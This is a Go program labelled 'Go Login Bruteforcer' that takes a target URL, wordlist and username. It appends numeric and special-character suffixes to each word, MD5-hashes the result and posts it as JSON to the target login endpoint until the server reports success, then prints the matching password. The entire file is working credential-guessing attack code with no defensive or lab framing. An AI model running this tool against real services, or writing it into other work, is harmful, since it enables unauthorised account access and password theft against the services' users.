package main

import (
	"bufio"
	"bytes"
	"crypto/md5"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
)

func main() {
	fmt.Println("[!] Go Login Bruteforcer")

	specialChar := []string{"|", "!", "_", "%", "&", "?", "#", "@", ";", ":", "^", "*", "#", "§"}
	args := os.Args[1:]
	var target string = args[0]
	var wordlist string = args[1]
	var username string = args[2]

	fmt.Printf("[-] Attacking: %s\n", target)
	fmt.Printf("[-] Using Worlist: %s\n", wordlist)
	fmt.Printf("[-] Username: %s\n", username)

	wordlistFile, err := os.Open(wordlist)
	if err != nil {
		os.Exit(-1)
	}
	defer wordlistFile.Close()

	scanner := bufio.NewScanner(wordlistFile)

	var suffixes []string = []string{}
	for _, special := range specialChar {
		for i := 0; i <= 9; i++ {
			for j := 0; j <= 9; j++ {
				suffixes = append(suffixes, fmt.Sprintf("%d%d%s", i, j, special))
			}
		}
	}
	for scanner.Scan() {
		for _, suffix := range suffixes {
			var guess string = scanner.Text()
			guess = strings.Trim(guess, "\n\r ") + suffix
			hashedGuess := md5.Sum([]byte(guess))
			fmt.Printf("\033[2K\r[?] Guess:%s", guess)

			body := map[string]string{"username": username, "password": hex.EncodeToString(hashedGuess[:])}
			jsonBody, err := json.Marshal(body)
			if err != nil {
				os.Exit(-1)
			}

			response, _ := http.Post(target, "application/json", bytes.NewBuffer(jsonBody))
			if response.StatusCode == 200 {
				responseBody, err := io.ReadAll(response.Body)
				response.Body.Close()
				if err != nil {
					os.Exit(-1)
				}

				jsonResponse := map[string]string{}
				json.Unmarshal(responseBody, &jsonResponse)
				if strings.ToLower(jsonResponse["Response"]) == "success" {
					fmt.Printf("\n[!] Found: %s\n", guess)
					os.Exit(1)
				}
			}
		}

	}

}
